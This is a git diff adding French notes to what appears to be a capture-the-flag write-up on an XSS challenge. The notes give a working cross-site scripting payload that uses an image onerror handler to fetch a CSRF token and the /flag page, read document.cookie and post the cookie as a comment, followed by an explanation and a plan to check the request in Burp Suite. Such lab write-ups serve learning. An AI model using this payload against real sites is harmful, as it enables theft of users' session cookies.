@@ -90,3 +90,24 @@ Solution finale :
 
 
 La deuxième XSS ne marche pas puisque j'essaye d'accéder à un Set-Cookie 
+
+
+Le bon payload pour la solution finale est la suivante : 
+
+```javascript
+"><img src=x onerror="fetch('/api/init_csrf',{credentials:'include'}).then(()=>fetch('/flag',{credentials:'include'})).then(()=>{var c=document.cookie;fetch('/post_comment',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'comment=FLAG='+encodeURIComponent(c)})})"></img>
+```
+
+Dans ce payload on crée une image qui n'as pas de source toujours pour faire en sorte que ça passe à l'execution du oneerror, lorsque cela est fait on récupère les informations du fichier /api/init_csrf donc le token CSRF du bot, on récupere c'est credentials quand cela est fait on récupere les information de la page /flag qui lui modifie le cookie du bot avec celui du flag/
+
+Et enfin on POST toute c'est informations dans les dépêche en créant une requête POST vers la page /post_comment qui est là où tout les dépêches passe pour savoir si l'utilisateur à bel est bien un token csrf si ce n'est pas le cas nous obtenons une erreur. 
+
+![](../img/Pasted%20image%2020260517173137.png)
+
+Et ont voit bel est bien que nous avons : 
+
+![](../img/Pasted%20image%2020260517173156.png)
+
+Il faut donc que l'utilisateur à un token CSRF propre à lui avant que le POST ce fasse. 
+
+Pour voir si c'est bien dans le /post_comment qu'il faut renvoyer nous allons utiliser Burpsuite et faire une requête POST vers l'url /post_comment 
